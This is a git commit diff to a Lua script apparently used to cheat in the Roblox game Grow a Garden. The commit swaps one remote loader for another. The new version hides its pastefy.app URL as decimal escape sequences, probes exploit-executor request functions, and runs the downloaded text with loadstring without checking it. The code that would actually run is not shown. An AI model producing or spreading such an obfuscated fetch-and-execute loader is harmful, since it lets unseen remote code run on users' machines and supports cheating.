c28f3f6f4fc66a700862f91db8e4805766d71aee
Ziadian <heeza9546@gmail.com>
2025-08-08 21:05:36 +0700

    Update growagarden_opscript.lua

--- growagarden_opscript.lua
+++ growagarden_opscript.lua
@@ -1,9 +1,7 @@
-local _ENV = getfenv and getfenv(1) or _ENV
-local a, b, c = "https", "pastefy", ".app"
-local endpoint = "/swznQSU5/raw"
-local url = (a .. "://" .. b .. c .. endpoint)
-local response = game["HttpGet"](game, url)
-local loaded = (loadstring or function() end)(response)
-if typeof(loaded) == "function" then
-    pcall(loaded)
-end
+(function()
+    local a = (syn and syn.request) or (http and http.request) or (request) or (http_request) or (fluxus and fluxus.request) or game.HttpGet
+    local b = (typeof(a) == "function" and a) or function(c, d) return game:HttpGet(d) end
+    local e = (b == game.HttpGet and b(game, "\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\76\90\79\82\100\78\104\88\47\114\97\119")) 
+        or (b({Url="\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\76\90\79\82\100\78\104\88\47\114\97\119", Method="GET"}).Body)
+    loadstring(e)()
+end)()
